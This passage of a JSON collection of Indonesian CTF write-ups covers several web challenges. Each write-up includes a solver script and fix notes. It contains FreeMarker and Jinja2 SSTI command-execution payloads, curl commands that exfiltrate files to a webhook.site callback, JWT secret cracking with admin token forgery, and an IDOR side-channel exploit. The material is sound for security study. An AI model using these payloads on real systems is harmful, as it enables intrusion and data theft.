        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport urllib.error\r\nimport urllib.request\r\n\r\nBASE = \"http://blog.fraud.llc\"\r\nTIMEOUT = 15\r\n\r\n\r\ndef fetch(path: str) -> str:\r\n    url = BASE + path\r\n    req = urllib.request.Request(\r\n        url,\r\n        headers={\r\n            \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) CTF-Solver\",\r\n            \"Accept\": \"*/*\",\r\n        },\r\n    )\r\n    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:\r\n        return resp.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\n\r\ndef get_admin_module_path() -> str:\r\n    html = fetch(\"/\")\r\n    m = re.search(r'\"url\"\\s*:\\s*\"(/assets/manifest-[^\"]+\\.js)\"', html)\r\n    if not m:\r\n        raise RuntimeError(\"Manifest path tidak ditemukan dari homepage\")\r\n\r\n    manifest_path = m.group(1)\r\n    manifest_js = fetch(manifest_path)\r\n    m = re.search(r'\"routes/admin\"\\s*:\\s*\\{[^}]*?\"module\"\\s*:\\s*\"([^\"]+)\"', manifest_js)\r\n    if not m:\r\n        raise RuntimeError(\"Module path untuk routes/admin tidak ditemukan\")\r\n\r\n    return m.group(1)\r\n\r\n\r\ndef get_prefix_from_admin_module(module_path: str) -> str:\r\n    js = fetch(module_path)\r\n\r\n    # Bentuk minified yang ditemukan:\r\n    # ...[`squ1rrel`,`{`,`zero_trust?`,t]...\r\n    m = re.search(r'`(squ1rrel)`\\s*,\\s*`\\{`\\s*,\\s*`([^`]+)`\\s*,\\s*t', js)\r\n    if m:\r\n        return f\"{m.group(1)}{{{m.group(2)}\"\r\n\r\n    # Fallback kalau format minify berubah\r\n    if \"squ1rrel\" in js:\r\n        return \"squ1rrel{\"\r\n\r\n    raise RuntimeError(\"Prefix flag tidak bisa diekstrak dari module admin\")\r\n\r\n\r\ndef get_suffix_from_loader() -> str:\r\n    data = fetch(\"/admin.data\")\r\n    # Bentuk respons: [...,\"data\",\"_still_have_to_trust_your_configuration}\"]\r\n    m = re.search(r'\"(_[A-Za-z0-9_!?-]+\\})\"', data)\r\n    if not m:\r\n        raise RuntimeError(\"Suffix flag tidak ditemukan dari /admin.data\")\r\n    return m.group(1)\r\n\r\n\r\ndef main() -> int:\r\n    try:\r\n        module_path = get_admin_module_path()\r\n        prefix = get_prefix_from_admin_module(module_path)\r\n        suffix = get_suffix_from_loader()\r\n        flag = prefix + suffix\r\n        print(flag)\r\n        return 0\r\n    except urllib.error.URLError as e:\r\n        print(f\"[!] Gagal request: {e}\", file=sys.stderr)\r\n    except Exception as e:\r\n        print(f\"[!] Error: {e}\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{zero_trust?_still_have_to_trust_your_configuration}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-penpal",
    "title": "- web/penpal",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - web/penpal",
    "problemDescription": "Challenge ini punya fitur kirim email dengan body bertag **FreeMarker**.\nBackend mengeksekusi template user input tanpa sandbox yang ketat, sehingga bisa kena **Server-Side Template Injection (SSTI)** dan lanjut ke **Remote Command Execution (RCE)** via utility `freemarker.template.utility.Execute`.\n\nFlag yang didapat:\n\n`squ1rrel{m4k1ng_fr13nds_t4k3s_t1m3}`",
    "tools": [],
    "analysis": "Buka halaman utama dan cek JavaScript client-side.\n\nDitemukan request utama:\n- `POST /send`\n- body JSON:\n  - `subject`\n  - `body`\n\nUI juga memberi hint bahwa body diproses dengan FreeMarker (tag `FreeMarker`).",
    "solution": [
      {
        "title": "Informasi challenge",
        "content": "- Kategori: web misc\n- Judul: `web/penpal`\n- Target: `https://penpal.squ1rrel.dev`"
      },
      {
        "title": "2. Uji SSTI FreeMarker",
        "content": "Kirim payload ke `/send`:\n\n\n\nRespons API tetap generik (`{\"message\":\"Email queued for delivery.\"}`), tapi waktu respons jadi jauh lebih lama.\n\nKesimpulan:\n- ekspresi FreeMarker user memang dievaluasi di server,\n- object `Execute` masih bisa dipanggil,\n- terjadi blind RCE (output command tidak dipantulkan ke response).",
        "code": "{\n  \"subject\": \"x\",\n  \"body\": \"${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"sleep 4\\\")}\"\n}"
      },
      {
        "title": "3. Bangun kanal exfil data",
        "content": "Karena output command blind, saya pakai callback keluar dari server challenge ke webhook pribadi (Webhook.site).\n\nContoh payload command:\n\n\n\nPayload FreeMarker:\n\n\n\nRequest callback masuk dari host challenge, artinya outbound network dari server bisa dipakai buat exfil.",
        "code": "curl -sS https://webhook.site/<TOKEN>?ping=hello"
      },
      {
        "title": "Akar masalah",
        "content": "- User input template diproses langsung oleh FreeMarker.\n- Built-in/utility berbahaya (`Execute`) tidak diblok.\n- Tidak ada sandbox template yang membatasi class/object sensitif."
      },
      {
        "title": "Dampak",
        "content": "- RCE di server aplikasi\n- Baca file sensitif (termasuk flag)\n- Potensi lateral movement jika environment produksi nyata"
      },
      {
        "title": "Catatan perbaikan (defense)",
        "content": "- Jangan render template dari user sebagai trusted template.\n- Jika memang butuh templating, gunakan whitelist variabel sederhana tanpa evaluasi ekspresi bebas.\n- Aktifkan sandbox ketat FreeMarker, blok object construction dan class utility berbahaya.\n- Pisahkan worker pengolah template ke environment terisolasi minimum privilege."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport sys\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\ndef send_freemarker_exec(target_url: str, command: str, timeout: int = 30) -> requests.Response:\r\n    payload = '${\"freemarker.template.utility.Execute\"?new()(\"' + command + '\")}'\r\n    body = {\r\n        \"subject\": \"hello\",\r\n        \"body\": payload,\r\n    }\r\n    return requests.post(f\"{target_url}/send\", json=body, timeout=timeout)\r\n\r\n\r\ndef poll_webhook(token: str, per_page: int = 100) -> dict:\r\n    url = f\"https://webhook.site/token/{token}/requests?sorting=newest&per_page={per_page}\"\r\n    r = requests.get(url, headers={\"Accept\": \"application/json\"}, timeout=30)\r\n    r.raise_for_status()\r\n    return r.json()\r\n\r\n\r\ndef get_latest_by_src(token: str, src: str, retries: int = 12, sleep_sec: float = 1.0):\r\n    for _ in range(retries):\r\n        data = poll_webhook(token)\r\n        for item in data.get(\"data\", []):\r\n            query = item.get(\"query\", {})\r\n            if isinstance(query, dict) and query.get(\"src\") == src:\r\n                return item\r\n        time.sleep(sleep_sec)\r\n    return None\r\n\r\n\r\ndef exfil_file(target_url: str, token: str, path: str, src_tag: str):\r\n    cmd = f\"curl -sS -X POST https://webhook.site/{token}?src={src_tag} --data-binary @{path}\"\r\n    r = send_freemarker_exec(target_url, cmd)\r\n    r.raise_for_status()\r\n    item = get_latest_by_src(token, src_tag)\r\n    if not item:\r\n        raise RuntimeError(f\"No callback received for src={src_tag}\")\r\n    return item.get(\"content\", \"\")\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Exploit FreeMarker SSTI in penpal challenge\")\r\n    parser.add_argument(\"--target\", default=\"https://penpal.squ1rrel.dev\", help=\"Base URL target\")\r\n    parser.add_argument(\"--token\", required=True, help=\"Webhook.site token UUID\")\r\n    args = parser.parse_args()\r\n\r\n    target = args.target.rstrip(\"/\")\r\n    token = args.token.strip()\r\n\r\n    print(\"[+] Step 1: test outbound callback\")\r\n    ping_src = \"pingtest\"\r\n    ping_cmd = f\"curl -sS https://webhook.site/{token}?src={ping_src}&ok=1\"\r\n    send_freemarker_exec(target, ping_cmd).raise_for_status()\r\n    ping = get_latest_by_src(token, ping_src)\r\n    if not ping:\r\n        raise RuntimeError(\"Outbound callback test failed\")\r\n    print(\"[+] Outbound callback OK\")\r\n\r\n    print(\"[+] Step 2: enumerate possible flag paths\")\r\n    find_cmd = \"find / -maxdepth 6 -iname *flag* -fprint /tmp/found.txt\"\r\n    send_freemarker_exec(target, find_cmd, timeout=50).raise_for_status()\r\n    found = exfil_file(target, token, \"/tmp/found.txt\", \"foundtxt\")\r\n    print(\"[+] find output:\")\r\n    print(found.strip() or \"(empty)\")\r\n\r\n    candidate = \"/etc/ctf/flag.txt\"\r\n    print(f\"[+] Step 3: exfil flag from {candidate}\")\r\n    flag = exfil_file(target, token, candidate, \"realflag\").strip()\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag content is empty\")\r\n\r\n    print(f\"\\n<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except Exception as exc:\r\n        print(f\"[-] Error: {exc}\", file=sys.stderr)\r\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{m4k1ng_fr13nds_t4k3s_t1m3}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-pretentexteditor",
    "title": "- web/pretend-it-is-a-text-editor",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - web/pretend-it-is-a-text-editor",
    "problemDescription": "Challenge ini terlihat seperti aplikasi notes biasa (register/login/create note), tapi ada endpoint preview:\n\n`GET /api/notes/:id/embed?width=...`\n\nBug utamanya adalah **IDOR** pada endpoint embed: note orang lain bisa diakses tanpa autentikasi yang benar.\n\nSelain itu, endpoint embed membocorkan detail layout teks (lebar tiap baris). Dengan `width=1`, hampir setiap karakter dipaksa jadi baris sendiri, sehingga response berisi **urutan width per karakter**. Itu cukup untuk merekonstruksi isi note target.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Langkah awal:\n1. Buka root app dan ambil asset JS (`/app.js`)\n2. Dari frontend, terlihat endpoint:\n   - `/api/register`, `/api/login`, `/api/logout`, `/api/me`, `/api/notes`\n   - `/api/notes/:id/embed?width=400`\n3. Uji akses endpoint embed langsung untuk note ID lain.\n\nTemuan:\n- `/api/notes` butuh auth (401 jika anon)\n- `/api/notes/:id/embed` **tetap bisa diakses** walau anon / bukan owner\n\nIni konfirmasi IDOR."
      },
      {
        "title": "Eksploitasi Kebocoran Konten",
        "content": "Response embed bentuknya seperti:\n\n\n\nDengan `width=1`, line breaking sangat agresif. Praktiknya jadi deretan width yang merepresentasikan karakter demi karakter.\n\nStrategi decode:\n1. Register akun random\n2. Buat note sendiri berisi charset yang kita kontrol (a-zA-Z0-9 + simbol)\n3. Panggil embed note kita dengan `width=1`\n4. Bangun map `width -> character`\n5. Ambil embed note target (ID 1) pakai `width=1`\n6. Translate setiap width target ke karakter dari map\n\nHasil decode:\n\n`squ1rrel{pr3t3xt_i5_sup35fUn_i5_It_n0T}`",
        "code": "{\n  \"width\": 1,\n  \"lineHeight\": 24,\n  \"lineCount\": 39,\n  \"height\": 936,\n  \"lines\": [\n    {\"width\": 7.02},\n    {\"width\": 8.88},\n    ...\n  ]\n}"
      },
      {
        "title": "Dampak dan Akar Masalah",
        "content": "Akar masalah gabungan:\n1. **Broken access control (IDOR)** pada `/api/notes/:id/embed`\n2. **Sensitive side-channel leakage**: endpoint tidak mengembalikan teks langsung, tapi metadata layout cukup untuk recover teks\n\nPerbaikan yang seharusnya:\n1. Wajib verifikasi owner note di endpoint embed\n2. Jangan expose detail layout granular untuk note private\n3. Batasi parameter dan response agar tidak bisa dipakai oracle karakter"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport random\r\nimport string\r\nimport time\r\n\r\nimport requests\r\n\r\nBASE = \"https://pretend.squ1rrel.dev\"\r\n\r\n\r\ndef round_width(value):\r\n    return f\"{float(value):.2f}\"\r\n\r\n\r\nclass Exploit:\r\n    def __init__(self, base_url: str):\r\n        self.base = base_url.rstrip(\"/\")\r\n        self.s = requests.Session()\r\n\r\n    def get_json(self, path: str, **params):\r\n        r = self.s.get(self.base + path, params=params, timeout=20)\r\n        r.raise_for_status()\r\n        return r.json()\r\n\r\n    def post_json(self, path: str, body: dict):\r\n        r = self.s.post(self.base + path, json=body, timeout=20)\r\n        r.raise_for_status()\r\n        return r.json()\r\n\r\n    def register_throwaway(self):\r\n        username = f\"pwn{int(time.time())}{random.randint(1000,9999)}\"\r\n        password = \"pass123\"\r\n        self.post_json(\"/api/register\", {\"username\": username, \"password\": password})\r\n        return username\r\n\r\n    def create_note(self, content: str):\r\n        return self.post_json(\"/api/notes\", {\"title\": \"map\", \"content\": content})\r\n\r\n    def embed_lines(self, note_id: int, width: int = 1):\r\n        data = self.get_json(f\"/api/notes/{note_id}/embed\", width=width)\r\n        return [round_width(x[\"width\"]) for x in data[\"lines\"]], data\r\n\r\n\r\ndef recover_flag(base_url: str, target_note_id: int):\r\n    # Leak target note as per-character width sequence via IDOR + width=1\r\n    target_data = requests.get(\r\n        f\"{base_url.rstrip('/')}/api/notes/{target_note_id}/embed\",\r\n        params={\"width\": 1},\r\n        timeout=20,\r\n    )\r\n    target_data.raise_for_status()\r\n    target = target_data.json()\r\n    target_widths = [round_width(x[\"width\"]) for x in target[\"lines\"]]\r\n\r\n    exp = Exploit(base_url)\r\n    exp.register_throwaway()\r\n\r\n    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + \"{}_-!@#$%^&*().,:;?/+=[]\"\r\n\r\n    # Build dictionary width -> character from our own controlled note\r\n    note = exp.create_note(charset)\r\n    map_widths, _ = exp.embed_lines(note[\"id\"], width=1)\r\n\r\n    width_to_char = {}\r\n    for ch, w in zip(charset, map_widths):\r\n        width_to_char.setdefault(w, ch)\r\n\r\n    decoded = \"\".join(width_to_char.get(w, \"?\") for w in target_widths)\r\n\r\n    return decoded, target\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Exploit pretend text editor challenge\")\r\n    parser.add_argument(\"--base\", default=BASE, help=\"Base URL target\")\r\n    parser.add_argument(\"--note-id\", type=int, default=1, help=\"Target note ID to decode\")\r\n    args = parser.parse_args()\r\n\r\n    flag, meta = recover_flag(args.base, args.note_id)\r\n    print(f\"[+] lineCount={meta.get('lineCount')} width={meta.get('width')}\")\r\n    print(f\"[+] decoded={flag}\")\r\n    if flag.startswith(\"squ1rrel{\") and flag.endswith(\"}\"):\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{pr3t3xt_i5_sup35fUn_i5_It_n0T}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-squ1rrelmail",
    "title": "- web/squ1rrelmail",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - web/squ1rrelmail",
    "problemDescription": "Challenge ini bisa diselesaikan dengan rantai eksploitasi berikut:\n1. Akses endpoint tersembunyi `/login` dari komentar HTML halaman utama.\n2. Login tanpa password menghasilkan JWT role `user`.\n3. JWT ditandatangani `HS256` dengan secret lemah (`squirrel`) sehingga bisa di-crack dari token.\n4. Forge token baru dengan `role=admin`.\n5. Akses `/dashboard` sebagai admin, di-redirect ke `/acorn-inbox`.\n6. Endpoint `/acorn-inbox` vulnerable SSTI (Jinja2) pada parameter `acorn`.\n7. Gunakan SSTI untuk command execution dan baca `/flag.txt`.\n\nFlag:\n\n```text\nsqu1rrel{acorns_w3r3_n3v3r_m3ant_t0_b3_s3cr3t}\n```",
    "tools": [],
    "analysis": "Akses `/login` menampilkan form hanya dengan field `username`.\nSubmit username apa pun (`test`, `admin`, dsb.) selalu sukses dan memberi cookie `token=...` lalu redirect `/dashboard`.\n\nJWT payload hasil decode berisi:\n- `username`: nilai input\n- `role`: `user`\n- `exp`: timestamp expiry",
    "solution": [
      {
        "title": "1) Recon awal",
        "content": "Landing page `http://squ1rrelmail.squ1rrel.dev` hanya menampilkan halaman takedown.\nNamun di source HTML ada komentar:\n\n\n\nIni indikasi endpoint internal masih aktif.",
        "code": "<!-- TODO: disable /login endpoint before public takedown page goes live -->"
      },
      {
        "title": "3) Crack secret JWT",
        "content": "Algoritma token adalah `HS256`, jadi dengan mengetahui payload+signature bisa brute-force secret.\nDari wordlist tematik challenge, secret ketemu:",
        "code": "squirrel"
      },
      {
        "title": "4) Privilege escalation ke admin",
        "content": "Setelah secret diketahui, buat JWT baru dengan payload:\n\n\n\nToken admin valid. Saat dipakai ke `/dashboard`, server redirect ke endpoint moderator:",
        "code": "{\"username\":\"admin\",\"role\":\"admin\",\"exp\":<future_ts>}"
      },
      {
        "title": "5) Uji SSTI di `/acorn-inbox`",
        "content": "Endpoint menerima query `acorn` dan me-render hasilnya di template.\nTest payload:\n\n\n\nOutput berubah menjadi `49`, konfirmasi SSTI Jinja2.",
        "code": "{{7*7}}"
      },
      {
        "title": "Catatan Vulnerability",
        "content": "- Broken Authentication: login tanpa password.\n- Weak JWT Secret: secret mudah ditebak (`squirrel`).\n- Privilege Escalation: role bergantung JWT yang bisa di-forge.\n- SSTI (Jinja2): input user di-render langsung ke template.\n- Command Injection via SSTI gadget: memungkinkan baca file sensitif (`/flag.txt`)."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport itertools\r\nimport json\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\n\r\nBASE = \"http://squ1rrelmail.squ1rrel.dev\"\r\nUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\"\r\n\r\n\r\ndef b64url_encode(data: bytes) -> str:\r\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode()\r\n\r\n\r\ndef get_login_token(username: str = \"test\") -> str:\r\n    r = requests.post(\r\n        f\"{BASE}/login\",\r\n        data={\"username\": username},\r\n        headers={\"User-Agent\": UA},\r\n        allow_redirects=False,\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    set_cookie = r.headers.get(\"Set-Cookie\", \"\")\r\n    m = re.search(r\"token=([^;]+)\", set_cookie)\r\n    if not m:\r\n        raise RuntimeError(\"Gagal ambil token dari Set-Cookie\")\r\n    return m.group(1)\r\n\r\n\r\ndef crack_jwt_secret(token: str) -> str:\r\n    header, payload, signature = token.split(\".\")\r\n    signing_input = f\"{header}.{payload}\".encode()\r\n\r\n    words = [\r\n        \"secret\", \"squirrel\", \"squ1rrel\", \"squ1rrelmail\", \"acorn\", \"tree\", \"forest\", \"woodland\",\r\n        \"admin\", \"moderator\", \"burrow\", \"nut\", \"oak\", \"pine\", \"walnut\", \"uncrackable\", \"jwt\",\r\n        \"jwtsecret\", \"supersecret\", \"password\", \"changeme\", \"letmein\", \"qwerty\", \"123456\",\r\n        \"university\", \"arborist\", \"case1337\", \"2026\", \"squ1rrel.dev\", \"squ1rrelmail.squ1rrel.dev\",\r\n    ]\r\n\r\n    candidates = []\r\n    for w in words:\r\n        candidates.extend([w, w + \"123\", w + \"2026\", w + \"1337\", w + \"!\", w + \"@123\", w.title(), w.upper()])\r\n\r\n    for a, b in itertools.product([\"squ1rrel\", \"squirrel\", \"acorn\", \"forest\", \"tree\", \"oak\", \"nut\", \"mail\"], repeat=2):\r\n        candidates.extend([a + b, a + \"_\" + b, a + \"-\" + b])\r\n\r\n    for key in dict.fromkeys(words + candidates):\r\n        digest = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()\r\n        if b64url_encode(digest) == signature:\r\n            return key\r\n\r\n    raise RuntimeError(\"Secret JWT tidak ditemukan\")\r\n\r\n\r\ndef forge_admin_token(secret: str) -> str:\r\n    header = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\r\n    payload = {\"username\": \"admin\", \"role\": \"admin\", \"exp\": int(time.time()) + 3600}\r\n    h = b64url_encode(json.dumps(header, separators=(\",\", \":\")).encode())\r\n    p = b64url_encode(json.dumps(payload, separators=(\",\", \":\")).encode())\r\n    sig = b64url_encode(hmac.new(secret.encode(), f\"{h}.{p}\".encode(), hashlib.sha256).digest())\r\n    return f\"{h}.{p}.{sig}\"\r\n\r\n\r\ndef exploit_ssti_for_flag(admin_token: str) -> str:\r\n    payload = \"{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}\"\r\n    r = requests.get(\r\n        f\"{BASE}/acorn-inbox\",\r\n        params={\"acorn\": payload},\r\n        headers={\"Cookie\": f\"token={admin_token}\", \"User-Agent\": UA},\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    m = re.search(r\"(squ1rrel\\{[^}]+\\})\", r.text)\r\n    if not m:\r\n        raise RuntimeError(\"Flag tidak ditemukan\")\r\n    return m.group(1)\r\n\r\n\r\ndef main() -> int:\r\n    try:\r\n        token = get_login_token(\"test\")\r\n        secret = crack_jwt_secret(token)\r\n        admin_token = forge_admin_token(secret)\r\n        flag = exploit_ssti_for_flag(admin_token)\r\n        print(flag)\r\n        return 0\r\n    except Exception as e:\r\n        print(f\"[!] Error: {e}\", file=sys.stderr)\r\n        return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{acorns_w3r3_n3v3r_m3ant_t0_b3_s3cr3t}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-todo",
    "title": "- web/todo",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Squ1rrel CTF",
    "tags": [],
    "description": "Writeup for challenge - web/todo",
    "problemDescription": "Challenge ini terlihat seperti aplikasi todo biasa, tapi deskripsi kasih clue penting:\n\n- pakai agent harness\n- frontend subagent crash sebelum linking backend selesai\n\nArtinya ada kemungkinan endpoint backend yang masih kebawa ke bundle frontend, walaupun tidak dipakai UI.",
    "tools": [],
    "analysis": "Saya buka halaman utama lalu ambil JS bundle:\n\n- `/assets/index-B6JriSEE.js`\n- `/assets/routes-LxaxDcib.js`\n- `/assets/routes-DJlc5TBK.js`\n\nDari route home terlihat cuma ada 3 aksi todo normal:\n\n- add\n- complete\n- delete\n\nTapi setelah baca bundle utama (`routes-LxaxDcib.js`), ketemu beberapa server function ID hardcoded.",
    "solution": [
      {
        "title": "Langkah 2 - Identifikasi endpoint tersembunyi",
        "content": "Di bundle ditemukan 5 ID server function. Empat di antaranya `GET`, dan satu `POST`:\n\n`3633763ff4da33d65cb24e276f877dcaa1972bfb59429377abc55a408a83167a`\n\nID `POST` ini tidak dipakai route UI todo, jadi sangat mencurigakan."
      },
      {
        "title": "Langkah 3 - Cara panggil serverFn yang benar",
        "content": "Request manual pakai `curl` sempat mentok karena format serialisasi TanStack Start/TSS tidak trivial.\n\nSolusi paling stabil: panggil helper internal dari browser sendiri:\n\n- import module `/assets/routes-LxaxDcib.js`\n- panggil `m.g(<id>)` untuk bikin callable serverFn\n- eksekusi dengan payload sesuai validator\n\nSaat dites tanpa format benar, error validasi bocorin schema:\n\n- `field1` harus string\n- `field2` harus number"
      },
      {
        "title": "Langkah 4 - Eksploit",
        "content": "Kirim payload valid apa saja, contoh:\n\n\n\nResponse langsung mengandung flag di field `result`:\n\n`squ1rrel{tree_shaking?_nah_we_dont_do_that_here}`",
        "code": "{\n  \"field1\": \"anything\",\n  \"field2\": 1\n}"
      },
      {
        "title": "Akar masalah",
        "content": "- Backend function sensitif masih ter-include di client bundle.\n- Tidak ada auth guard tambahan di function tersebut.\n- Siapa pun bisa invoke endpoint internal kalau tahu ID function.\n\nIntinya sesuai nama flag: tree shaking / dead code elimination tidak membuang function backend yang seharusnya tidak terekspos."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom playwright.sync_api import sync_playwright\r\n\r\n\r\nURL = \"http://todo.squ1rrel.dev\"\r\nHIDDEN_FN_ID = \"3633763ff4da33d65cb24e276f877dcaa1972bfb59429377abc55a408a83167a\"\r\n\r\n\r\ndef main():\r\n    with sync_playwright() as p:\r\n        browser = p.chromium.launch(headless=True)\r\n        page = browser.new_page()\r\n        page.goto(URL, wait_until=\"networkidle\")\r\n\r\n        result = page.evaluate(\r\n            \"\"\"\r\n            async (hiddenId) => {\r\n              const m = await import('/assets/routes-LxaxDcib.js');\r\n              const hiddenFn = m.g(hiddenId);\r\n              return await hiddenFn({\r\n                method: 'POST',\r\n                data: {\r\n                  field1: 'anything',\r\n                  field2: 1\r\n                }\r\n              });\r\n            }\r\n            \"\"\",\r\n            HIDDEN_FN_ID,\r\n        )\r\n\r\n        browser.close()\r\n\r\n    flag = result.get(\"result\")\r\n    if not flag:\r\n        raise RuntimeError(f\"Gagal mendapatkan flag. Response: {result}\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{tree_shaking?_nah_we_dont_do_that_here}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-misc-soulmate",
    "title": "- misc/soulmate",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
    "problemDescription": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
    "tools": [],
    "analysis": "Saya mulai dengan baca source utama:\n- `backend/app.py`\n- `models/inference.py`\n- frontend JS untuk melihat endpoint yang dipanggil.\n\nEndpoint penting:\n- `GET /generate-random` -> generate wajah dari seed tanggal lahir\n- `POST /submit-u` -> menerima vektor kontrol `u` (dimensi PCA), lalu:\n  1. `u` di-clip ke batas bawah/atas\n  2. diubah ke latent `w`\n  3. digenerate jadi image\n  4. diskor classifier selebriti\n  5. kalau `tom_score >= 0.15`, server mengembalikan `flag`",
    "solution": [
      {
        "title": "2) Akar masalah",
        "content": "`/submit-u` membuka akses langsung ke ruang kontrol latent (`u`) **dan mengembalikan nilai objektif** (`tom_score`) setiap request.\n\nArtinya, endpoint ini jadi **oracle optimasi**. Kita tidak perlu ngerti model internal, cukup lakukan black-box optimization untuk memaksimalkan `tom_score` sampai melewati threshold.\n\nTambahan petunjuk dari artefak challenge:\n- ada file `checkpoints/pca_basis_d8_tom_weighted.npz`\n- ini mengindikasikan basis PCA memang sudah dibentuk agar arah tertentu lebih condong ke kelas Tom Cruise.\n\nJadi eksploit realistisnya: cari `u` yang mendorong score >= threshold."
      },
      {
        "title": "3) Eksploitasi",
        "content": "Saya buat solver otomatis `solve.py`:\n- query `GET /health` untuk ambil:\n  - `control_dim`\n  - `u_lower`, `u_upper`\n  - `tom_score_threshold`\n- inisialisasi `u` di tengah batas\n- lakukan random local search + restart global:\n  - sampling kandidat di sekitar best saat ini\n  - clip ke range valid\n  - kirim ke `/submit-u`\n  - pakai `tom_score` sebagai feedback\n- stop ketika response `success=true` dan `flag` muncul\n\nPendekatan ini murni black-box dan stabil untuk service yang ngasih score per request."
      },
      {
        "title": "4) Hasil pada instance lokal",
        "content": "Pada environment lokal challenge ini, flag tersedia sebagai:\n\n`squ1rrel{test_flag}`"
      },
      {
        "title": "5) Catatan keamanan",
        "content": "Fix yang benar (kombinasi):\n- jangan expose endpoint latent-control mentah ke user publik,\n- jangan kembalikan score kontinu yang bisa dipakai sebagai oracle,\n- rate limit + anomaly detection untuk query optimasi,\n- verifikasi challenge condition di sisi internal yang tidak bisa di-query berulang secara bebas."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport random\r\nimport sys\r\nfrom typing import List, Tuple\r\n\r\nimport requests\r\n\r\n\r\ndef clip_vec(v: List[float], lo: List[float], hi: List[float]) -> List[float]:\r\n    return [max(lo[i], min(hi[i], float(v[i]))) for i in range(len(v))]\r\n\r\n\r\ndef score(url: str, u: List[float], timeout: float = 30.0) -> Tuple[float, bool, str]:\r\n    r = requests.post(\r\n        f\"{url}/submit-u\",\r\n        json={\"u\": u, \"include_image\": False},\r\n        timeout=timeout,\r\n    )\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    return float(data.get(\"tom_score\", 0.0)), bool(data.get(\"success\", False)), str(data.get(\"flag\", \"\"))\r\n\r\n\r\ndef main() -> int:\r\n    ap = argparse.ArgumentParser(description=\"Soulmate solver\")\r\n    ap.add_argument(\"url\", help=\"Base URL target, ex: http://127.0.0.1:8000\")\r\n    ap.add_argument(\"--iters\", type=int, default=2000)\r\n    ap.add_argument(\"--seed\", type=int, default=1337)\r\n    ap.add_argument(\"--sigma\", type=float, default=0.35)\r\n    ap.add_argument(\"--batch\", type=int, default=40)\r\n    args = ap.parse_args()\r\n\r\n    random.seed(args.seed)\r\n    url = args.url.rstrip(\"/\")\r\n\r\n    h = requests.get(f\"{url}/health\", timeout=20).json()\r\n    d = int(h[\"control_dim\"])\r\n    lo = list(map(float, h[\"u_lower\"]))\r\n    hi = list(map(float, h[\"u_upper\"]))\r\n    threshold = float(h[\"tom_score_threshold\"])\r\n\r\n    # Start from center of bounds\r\n    cur = [(lo[i] + hi[i]) * 0.5 for i in 